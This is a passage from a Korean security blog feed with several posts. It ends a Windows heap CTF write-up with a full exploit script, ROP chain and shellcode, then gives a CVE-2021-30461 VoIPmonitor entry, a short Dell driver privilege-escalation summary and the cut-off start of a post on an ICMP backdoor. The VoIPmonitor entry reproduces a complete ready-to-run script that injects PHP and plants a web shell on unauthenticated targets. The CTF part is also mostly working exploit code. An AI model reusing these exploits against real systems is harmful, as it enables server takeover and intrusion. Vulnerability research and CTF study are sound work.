pebldr+<span class="hljs-number">0x20</span>)imagebase = readmem(key, IMOML+<span class="hljs-number">0x20</span>)kernel32 = readmem(key, imagebase+<span class="hljs-number">0x3000</span>) - <span class="hljs-number">0x22460</span><span class="hljs-comment"># leak from IAT</span>peb = readmem(key, ntdll + <span class="hljs-number">0x165328</span>) - <span class="hljs-number">0x240</span>teb = peb + <span class="hljs-number">0x1000</span>stack = readmem(key,teb+<span class="hljs-number">0x10</span>)process_parameter = readmem(key, peb+<span class="hljs-number">0x20</span>)stdin = readmem(key, process_parameter+<span class="hljs-number">0x20</span>)stdout = readmem(key, process_parameter+<span class="hljs-number">0x28</span>)ret_ins = imagebase+<span class="hljs-number">0x1b60</span> ret = stack+<span class="hljs-number">0x2500</span><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<span class="hljs-keyword">if</span>(readmem(key,ret) == ret_ins):<span class="hljs-keyword">break</span>ret += <span class="hljs-number">8</span>add(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x440</span>, <span class="hljs-string">&quot;AAAA&quot;</span>)add(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;AAAA&quot;</span>)add(<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;BBBB&quot;</span>)add(<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;CCCC&quot;</span>)add(<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;DDDD&quot;</span>)delete(<span class="hljs-string">&quot;B&quot;</span>)delete(<span class="hljs-string">&quot;D&quot;</span>)<span class="hljs-comment"># leak header, fd, bk, chunk address</span>view(<span class="hljs-string">&apos;A&apos;</span>)p.recvuntil(<span class="hljs-string">&quot;Data:&quot;</span>)p.recv(<span class="hljs-number">0x108</span>)header = u64(p.recv(<span class="hljs-number">8</span>))B_fd = u64(p.recv(<span class="hljs-number">8</span>))<span class="hljs-comment"># B_fd = D chunk address</span>B_bk = u64(p.recv(<span class="hljs-number">8</span>))p.recv(<span class="hljs-number">0x210</span>)D_fd = u64(p.recv(<span class="hljs-number">8</span>))D_bk = u64(p.recv(<span class="hljs-number">8</span>))<span class="hljs-comment"># D_bk = B chunk address</span>user = imagebase + <span class="hljs-number">0x5620</span>pwd = imagebase + <span class="hljs-number">0x5648</span><span class="hljs-comment"># we make heap </span><span class="hljs-comment"># B -&gt; fake_chunk(pwd) -&gt; fake_chunk(user) -&gt; D</span><span class="hljs-comment"># overwrite B_fd </span><span class="hljs-comment"># B -&gt; fake_chunk(pwd)</span>add(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">0x100</span> + p64(<span class="hljs-number">0</span>) + p64(header) + p64(pwd + <span class="hljs-number">0x10</span>))<span class="hljs-comment"># logout</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;4&quot;</span>)<span class="hljs-comment"># header</span>fake_pwd = <span class="hljs-string">&quot;phdphd&quot;</span> + <span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">2</span> + p64(header)<span class="hljs-comment"># fd, bk</span>fake_pwd += p64(user + <span class="hljs-number">0x10</span>) + p64(D_bk)[:<span class="hljs-number">-2</span>]<span class="hljs-comment"># header</span>fake_user = <span class="hljs-string">&quot;ddaa&quot;</span> + <span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">4</span> + p64(header)<span class="hljs-comment"># fd, bk</span>fake_user += p64(D_fd) + p64(pwd + <span class="hljs-number">0x10</span>)[:<span class="hljs-number">-2</span>]login(fake_user, fake_pwd)cnt = <span class="hljs-number">0</span>_ptr = <span class="hljs-number">0</span>_base = retflag = <span class="hljs-number">0x2080</span>fd = <span class="hljs-number">0</span>bufsize = <span class="hljs-number">0x110</span>obj = p64(_ptr) + p64(_base) + p32(cnt) + p32(flag)obj += p32(fd) + p32(<span class="hljs-number">0</span>) + p64(bufsize) +p64(<span class="hljs-number">0</span>)obj += p64(<span class="hljs-number">0xffffffffffffffff</span>) + p32(<span class="hljs-number">0xffffffff</span>) + p32(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>add(<span class="hljs-string">&quot;B_REALLOC&quot;</span>,<span class="hljs-number">0x100</span>, obj)<span class="hljs-comment"># file structure</span>add(<span class="hljs-string">&quot;PWD_CHUNK&quot;</span>,<span class="hljs-number">0x100</span>, <span class="hljs-string">&quot;F&quot;</span>*<span class="hljs-number">0x10</span>+p64(D_bk)) <span class="hljs-comment">#overwrite fp to chunk B</span><span class="hljs-comment"># logout</span>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;4&quot;</span>)login(<span class="hljs-string">&quot;aaaa&quot;</span>,<span class="hljs-string">&quot;aaaa&quot;</span>)virtualprotect = kernel32 + <span class="hljs-number">0x1afe0</span>readfile = kernel32 + <span class="hljs-number">0x22460</span>writefile = kernel32 + <span class="hljs-number">0x22550</span>createfile = kernel32 + <span class="hljs-number">0x220d0</span>pop_rdx_rcx_r8_to_r11 = ntdll + <span class="hljs-number">0x8d150</span>sc_address = imagebase + <span class="hljs-number">0x5000</span><span class="hljs-comment"># call readfile(stdin, sc_address, 0x100, sc_address+0x100)</span>rop_buf = p64(pop_rdx_rcx_r8_to_r11)rop_buf += p64(sc_address) + p64(stdin) + p64(<span class="hljs-number">0x100</span>) + p64(sc_address + <span class="hljs-number">0x100</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(readfile)<span class="hljs-comment"># call virtualprotect(sc_address, 0x1000, 0x40, sc_address+0x100-8)  </span>rop_buf += p64(pop_rdx_rcx_r8_to_r11) rop_buf += p64(<span class="hljs-number">0x1000</span>) + p64(sc_address) + p64(<span class="hljs-number">0x40</span>) + p64(sc_address + <span class="hljs-number">0x100</span> <span class="hljs-number">-8</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(virtualprotect) + p64(sc_address)p.send(rop_buf.ljust(<span class="hljs-number">0x100</span><span class="hljs-number">-8</span>)+p64(<span class="hljs-number">4</span>))shellcode = <span class="hljs-string">f&apos;&apos;&apos;</span><span class="hljs-string">jmp readflag</span><span class="hljs-string">flag:</span><span class="hljs-string">pop r11</span><span class="hljs-string">createfile:</span><span class="hljs-string">mov qword ptr [rsp + 0x30], 0</span><span class="hljs-string">mov qword ptr [rsp + 0x28], 0x80</span><span class="hljs-string">mov qword ptr [rsp + 0x20], 3</span><span class="hljs-string">xor r9, r9</span><span class="hljs-string">mov r8, 1</span><span class="hljs-string">mov rdx, 0x80000000</span><span class="hljs-string">mov rcx, r11</span><span class="hljs-string">mov rax, <span class="hljs-subst">{createfile}</span></span><span class="hljs-string">call rax</span><span class="hljs-string">readfile:</span><span class="hljs-string">mov qword ptr [rsp + 0x20], 0</span><span class="hljs-string">lea r9, [rsp + 0x200]</span><span class="hljs-string">mov r8, 0x100</span><span class="hljs-string">lea rdx, [rsp + 0x100]</span><span class="hljs-string">mov rcx, rax</span><span class="hljs-string">mov rax, <span class="hljs-subst">{readfile}</span></span><span class="hljs-string">call rax</span><span class="hljs-string">writefile:</span><span class="hljs-string">mov qword ptr [rsp + 0x20], 0</span><span class="hljs-string">lea r9, [rsp + 0x200]</span><span class="hljs-string">mov r8, 0x100</span><span class="hljs-string">lea rdx, [rsp + 0x100]</span><span class="hljs-string">mov rcx, <span class="hljs-subst">{stdout}</span></span><span class="hljs-string">mov rax, <span class="hljs-subst">{writefile}</span></span><span class="hljs-string">call rax</span><span class="hljs-string">loop:</span><span class="hljs-string">jmp loop</span><span class="hljs-string">readflag:</span><span class="hljs-string">call flag</span><span class="hljs-string">&apos;&apos;&apos;</span>shellcode = (asm(shellcode) + <span class="hljs-string">&quot;flag.txt\x00&quot;</span>).ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">&quot;\x90&quot;</span>)p.send(shellcode)p.interactive()</code></pre><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%207.png" alt="pwncoolsexy-part5/Untitled%207.png"></p><p>&#xD5D8;&#xB09C;&#xD588;&#xB2E4;&#x2026; </p><h1 id="&#xB9C8;&#xBB34;&#xB9AC;"><a href="#&#xB9C8;&#xBB34;&#xB9AC;" class="headerlink" title="&#xB9C8;&#xBB34;&#xB9AC;"></a>&#xB9C8;&#xBB34;&#xB9AC;</h1><p>&#xB4DC;&#xB514;&#xC5B4; &#xD3F0;&#xCFE8;&#xC139;&#xC2DC; &#xC2DC;&#xB9AC;&#xC988; &#xB9C8;&#xC9C0;&#xB9C9; &#xAE00;&#xAE4C;&#xC9C0; &#xBAA8;&#xB450; &#xB05D;&#xB0AC;&#xC2B5;&#xB2C8;&#xB2E4; &#xC9DE;&#xC9DD;&#x3149;&#x314F;&#x3131; !  </p><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%201.png" alt="pwncoolsexy-part5/Untitled%201.png"></p><p>&#xC624;&#xB79C;&#xB9CC;&#xC5D0; Part 1 &#xAE00;&#xC744; &#xBCF4;&#xBA74;&#xC11C; &#xC2DC;&#xB9AC;&#xC988; &#xBAA9;&#xD45C;&#xB97C; &#xB2E4;&#xC2DC; &#xBD24;&#xB294;&#xB370;.. &#xC6D0;&#xB798; &#xACC4;&#xD68D;&#xC5D0; &#xB531; &#xB9DE;&#xAC8C; Part 5&#xB85C; &#xB9C8;&#xBB34;&#xB9AC;&#xB410;&#xB124;&#xC694;. &#xC0AC;&#xC2E4; &#xAC70;&#xC758; &#xBB34;&#xACC4;&#xD68D;&#xC774;&#xB098; &#xB2E4;&#xB984;&#xC5C6;&#xC5C8;&#xB294;&#xB370; &#xB2E4;&#xD589;&#xC774;&#xB2E4; &#xD734;&#x314E;; </p><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%202.png" alt="pwncoolsexy-part5/Untitled%202.png"></p><p>&#xC57D; 3&#xAC1C;&#xC6D4;&#xAC04; &#xC9C4;&#xD589;&#xD55C; &#xC815;&#xB4E0; &#xC2DC;&#xB9AC;&#xC988;&#xB97C; &#xB5A0;&#xB098;&#xBCF4;&#xB0B4;&#xBA70;.. &#xC774; &#xAE00;&#xC774; &#xC708;&#xB3C4;&#xC6B0;&#xB97C; &#xCC98;&#xC74C; &#xC2DC;&#xC791;&#xD558;&#xC2DC;&#xB294; &#xBD84;&#xB4E4;&#xAED8; &#xB9CE;&#xC740; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xC5C8;&#xC73C;&#xBA74; &#xC88B;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; &#xB2E4;&#xC74C;&#xC740; &#xBB58; &#xD560;&#xC9C0; &#xACE0;&#xBBFC;&#xD574;&#xC57C; &#xD558;&#xB294;&#xB370; &#xC544; &#xBB50;&#xD558;&#xC9C0; &#x3141;&#x3134;&#x3147;&#x3139; </p><p>&#xADF8;&#xB7FC; &#xD55C;&#xB3D9;&#xC548;&#xC740; &#xADF8;&#xB3D9;&#xC548; &#xBD10; &#xB450;&#xC5C8;&#xB358; &#xBC88;&#xC5ED;&#xAE00;&#xACFC; &#xD558;&#xB8E8;&#xD55C;&#xC904;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! </p><ul><li>&#xBAA8;&#xB4E0; &#xC2DC;&#xB9AC;&#xC988; &#xAE00;&#xC758; &#xC624;&#xB958; &#xBC0F; &#xC624;&#xD0C0; &#xC9C0;&#xC801;&#xC740; &#xC5B8;&#xC81C;&#xB098; &#xD658;&#xC601;&#xC785;&#xB2C8;&#xB2E4;</li></ul><p><img src="/2021/05/09/l0ch/pwncoolsexy-part5/Untitled%203.png" alt="pwncoolsexy-part5/Untitled%203.png"></p><blockquote><p>&#xC9C4;&#xC9DC; &#xB05D;!</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>heap</tag>
      
      <tag>ctf</tag>
      
      <tag>L0ch</tag>
      
      <tag>research</tag>
      
      <tag>lfh</tag>
      
      <tag>nt heap</tag>
      
      <tag>hitcon</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-30461: VoIPmonitor RCE</title>
    <link href="/2021/05/08/fabu1ous/2021-05-08/"/>
    <url>/2021/05/08/fabu1ous/2021-05-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-voipmonitor-unauth-rce/">VoIPmonitor UnAuth RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>VoIPmonitor &lt;= 24.60</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>&#xC624;&#xD508;&#xC18C;&#xC2A4; network packet sniffer&#xC778; VoIPmonitor&#xC5D0;&#xC11C; RCE&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>SPOOLDIR</code> &#xD639;&#xC740; <code>recheck</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; POST &#xC694;&#xCCAD;&#xC744; &#xCC98;&#xB9AC;&#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. <code>SPOOLDIR</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xAC12;&#xC740; UI &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xAC00; &#xD638;&#xCD9C;&#xD558;&#xB294; <code>config/configuration.php</code>&#xC5D0; &#xC544;&#xBB34;&#xB7F0; &#xD544;&#xD130;&#xB098; &#xAC00;&#xACF5; &#xC5C6;&#xC774; &#xC788;&#xB294; &#xADF8;&#xB300;&#xB85C; &#xC0BD;&#xC785;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xC778;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xB77C;&#xB3C4; &#xC6F9; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB97C; &#xD1B5;&#xD574; &#xC784;&#xC758;&#xC758; PHP &#xCF54;&#xB4DC;&#xB97C; &#xC6D0;&#xACA9;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD574;  &#xC90D;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs python"><span class="hljs-keyword">import</span> argparse<span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> argv,exit<span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> random<span class="hljs-keyword">import</span> string<span class="hljs-keyword">try</span>:    <span class="hljs-keyword">import</span> requests<span class="hljs-keyword">except</span> ImportError:    print(<span class="hljs-string">&quot;pip3 install requests &quot;</span>)print(<span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">###############################################</span><span class="hljs-string">#              VOIP Monitor RCE               #</span><span class="hljs-string">###############################################</span><span class="hljs-string">&quot;&quot;&quot;</span>)headers = {<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>, <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;en-US,en;q=0.5&quot;</span>, <span class="hljs-string">&quot;Accept-Encoding&quot;</span>: <span class="hljs-string">&quot;gzip, deflate&quot;</span>, <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>, <span class="hljs-string">&quot;Connection&quot;</span>: <span class="hljs-string">&quot;close&quot;</span>}<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_target</span>(<span class="hljs-params">args</span>):</span>    hostname = args.host    path = args.path    <span class="hljs-keyword">if</span> path:        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;http://<span class="hljs-subst">{hostname}</span>/<span class="hljs-subst">{path}</span>/index.php&quot;</span>    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;http://<span class="hljs-subst">{hostname}</span>/index.php&quot;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set_tmp</span>(<span class="hljs-params">args</span>):</span>    <span class="hljs-keyword">global</span> headers    target = get_target(args)    n_data = {<span class="hljs-string">&quot;SPOOLDIR&quot;</span>: <span class="hljs-string">&quot;/tmp&quot;</span>, <span class="hljs-string">&quot;recheck&quot;</span>: <span class="hljs-string">&quot;annen&quot;</span>}    set_totmp = requests.post(target, n_data, headers=headers)    print(<span class="hljs-string">f&quot;[*] set /tmp <span class="hljs-subst">{set_totmp}</span>&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkVulnerability</span>(<span class="hljs-params">args</span>):</span>    <span class="hljs-keyword">global</span> headers    target = get_target(args)    print(<span class="hljs-string">f&quot;[+] Attacking <span class="hljs-subst">{target}</span>&quot;</span>)    testcmd = {<span class="hljs-string">&quot;SPOOLDIR&quot;</span>: <span class="hljs-string">&quot;test\&quot;.system(id).\&quot;&quot;</span>, <span class="hljs-string">&quot;recheck&quot;</span>: <span class="hljs-string">&quot;annen&quot;</span>}    response_text = <span class="hljs-string">b&quot;uid=&quot;</span>    testcmd_req = requests.post(target, testcmd, verify=<span class="hljs-literal">False</span>, headers=headers)    <span class="hljs-keyword">if</span> response_text <span class="hljs-keyword">in</span> testcmd_req.content:        print(<span class="hljs-string">&quot;[*] host is vulnerable&quot;</span>)    <span class="hljs-keyword">else</span>:        print(<span class="hljs-string">&quot;[-] host is not vulnerable&quot;</span>)        exit()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">uploadshell</span>(<span class="hljs-params">args</span>):</span>    <span class="hljs-keyword">global</span> headers    hostname = args.host    path = args.path    shell_path = <span class="hljs-string">&quot;&quot;</span>    shellfilename = str ( <span class="hljs-string">&apos;&apos;</span>.join(random.choice(string.ascii_lowercase) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>)) )    target = get_target(args)    rce_payload = {<span class="hljs-string">&quot;SPOOLDIR&quot;</span>: <span class="hljs-string">f&quot;/tmp\&quot;.file_put_contents(&apos;<span class="hljs-subst">{shellfilename}</span>.php&apos;,&apos;&lt;?php echo system($_GET[\&quot;a\&quot;]);&apos;).\&quot;&quot;</span>, <span class="hljs-string">&quot;recheck&quot;</span>: <span class="hljs-string">&quot;annen&quot;</span>}    rce_req = requests.post(target, headers=headers, data=rce_payload)    print(<span class="hljs-string">f&quot;[*] uploading shell <span class="hljs-subst">{rce_req.status_code}</span>&quot;</span>)    <span class="hljs-keyword">if</span> path:        shell_path = <span class="hljs-string">f&quot;http://<span class="hljs-subst">{hostname}</span>/<span class="hljs-subst">{path}</span>/<span class="hljs-subst">{shellfilename}</span>.php&quot;</span>    <span class="hljs-keyword">else</span>:        shell_path = <span class="hljs-string">f&quot;http://<span class="hljs-subst">{hostname}</span>/<span class="hljs-subst">{shellfilename}</span>.php&quot;</span>    shell_check = requests.get(shell_path, headers=headers, params={<span class="hljs-string">&apos;a&apos;</span>:<span class="hljs-string">&apos;id&apos;</span>})    print(<span class="hljs-string">f&quot;[*] RCE Check : <span class="hljs-subst">{shell_check.text}</span>&quot;</span>)    print(<span class="hljs-string">f&quot;[*] Your Shell at <span class="hljs-subst">{shell_path}</span>&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&apos;VoIP Monitor all versions command execution&apos;</span>)    parser.add_argument(<span class="hljs-string">&apos;-t&apos;</span>,<span class="hljs-string">&apos;--host&apos;</span>,help=<span class="hljs-string">&apos;Host&apos;</span>, type=str)    parser.add_argument(<span class="hljs-string">&apos;-b&apos;</span>, <span class="hljs-string">&apos;--path&apos;</span>,help=<span class="hljs-string">&apos;Path of the VoIP Monitor&apos;</span>, type=str)    args = parser.parse_args()    set_tmp(args)    checkVulnerability(args)    set_tmp(args)    uploadshell(args)    set_tmp(args)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    main()</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-21551: 수억 대의 Dell PC에 영향을 주는 권한 상승 취약점</title>
    <link href="/2021/05/07/l0ch/2021-05-07/"/>
    <url>/2021/05/07/l0ch/2021-05-07/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.sentinelone.com/cve-2021-21551-hundreds-of-millions-of-dell-computers-at-risk-due-to-multiple-bios-driver-privilege-escalation-flaws/">CVE-2021-21551- Hundreds Of Millions Of Dell Computers At Risk Due to Multiple BIOS Driver Privilege Escalation Flaws</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Dell Windows device</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2009&#xB144;&#xBD80;&#xD130; Dell&#xC774; &#xCD9C;&#xC2DC;&#xD55C; &#xC218;&#xC5B5; &#xB300;&#xC758; Windows &#xB514;&#xBC14;&#xC774;&#xC2A4;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xC8FC;&#xB294; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xB4DC;&#xB77C;&#xC774;&#xBC84; <code>dbutil_2_3.sys</code>&#xB294; Dell BIOS &#xC720;&#xD2F8;&#xB9AC;&#xD2F0;&#xB97C; &#xD1B5;&#xD55C; &#xD38C;&#xC6E8;&#xC5B4; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB85C; 2009&#xB144;&#xBD80;&#xD130; Dell&#xC758; &#xB300;&#xBD80;&#xBD84;&#xC758; Windows &#xB514;&#xBC14;&#xC774;&#xC2A4;&#xC5D0; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC815;&#xAE30;&#xC801;&#xC778; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xC5D0; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xB294; &#xB2E4;&#xC12F; &#xAC1C;&#xC758; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC73C;&#xBA70; &#xB2E8;&#xC77C; CVE&#xAC00; &#xD560;&#xB2F9;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.  &#xCCAB; &#xBC88;&#xC9F8; &#xCDE8;&#xC57D;&#xC810;&#xC740; <a href="https://ko.wikipedia.org/wiki/&#xC811;&#xADFC;_&#xC81C;&#xC5B4;_&#xBAA9;&#xB85D;">ACL(Access Control List)</a> &#xAD6C;&#xC131; &#xBBF8;&#xD761;&#xC73C;&#xB85C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xAD8C;&#xD55C; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC758; IOCTL &#xC694;&#xCCAD;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC5B4; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xAD8C;&#xD55C; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; IOCTL <code>0x9B0C1EC8</code> &#xB85C; <code>memmove</code> &#xD568;&#xC218;&#xC5D0; &#xC804;&#xB2EC;&#xB418;&#xB294; &#xC778;&#xC218;&#xB97C; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC5B4; arbitrary memory read/write&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD574; <code>EPROCESS</code>&#xC758; &#xD1A0;&#xD070; &#xAD8C;&#xD55C; &#xBA64;&#xBC84;&#xC778; <code>Present</code> &#xBC0F; <code>Enabled</code>&#xC744; &#xB36E;&#xC5B4;&#xC4F0;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xB85C;&#xCEEC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC81C;&#xBCF4;&#xD55C; SentinelLabs&#xB294; &#xCCAB; &#xBC88;&#xC9F8;&#xB97C; &#xC81C;&#xC678;&#xD55C; &#xB098;&#xBA38;&#xC9C0; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4; &#xBC0F; PoC&#xB294; 2021&#xB144; 6&#xC6D4; 1&#xC77C;&#xAE4C;&#xC9C0; &#xACF5;&#xAC1C;&#xB97C; &#xBCF4;&#xB958;&#xD558;&#xACA0;&#xB2E4;&#xACE0; &#xBC1D;&#xD614;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>windows</tag>
      
      <tag>arbitrary read</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary write</tag>
      
      <tag>dell</tag>
      
      <tag>kernel driver</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] ICMP 터널링을 사용한 백도어 Pingback</title>
    <link href="/2021/05/06/idioth/2021-05-06/"/>
    <url>/2021/05/06/idioth/2021-05-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/backdoor-at-the-end-of-the-icmp-tunnel/">Pingback: Backdoor At The End Of The ICMP Tunnel</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows </li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ICMP &#xD130;&#xB110;&#xB9C1;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD1B5;&#xC2E0; &#xD0D0;&#xC9C0;&#xB97C; &#xC6B0;&#xD68C;&#xD55C; &#xB4A4; &#xAC10;&#xC5FC;&#xB41C; PC&#xC5D0;&#xC11C; &#xC9C0;&#xC18D;&#xC801;&#xC73C;&#xB85C; &#xC784;&#xC758; &#xBA85;&#xB839;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; &#xBC31;&#xB3C4;&#xC5B4;&#xAC00; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB294; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;, &#xBA54;&#xC2DC;&#xC9C0; &#xD050; &#xBC0F; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xACFC; &#xAC19;&#xC740; &#xC5EC;&#xB7EC; &#xB9AC;&#xC18C;&#xC2A4; &#xAD00;&#xB9AC;&#xC790;&#xC5D0; &#xAC78;&#xCCD0;&#xC788;&#xB294; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC744; &#xC870;&#xC815;&#xD558;&#xB294; <a href="https://en.wikipedia.org/wiki/Microsoft_Distributed_Transaction_Coordinator">msdtc</a>(Microsoft Distributed Transaction Coordinator)&#xB97C; &#xD1B5;&#xD574; &#xC545;&#xC131; DLL <code>oci.dll</code>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xC9C0;&#xC18D;&#xC131;&#xC744; 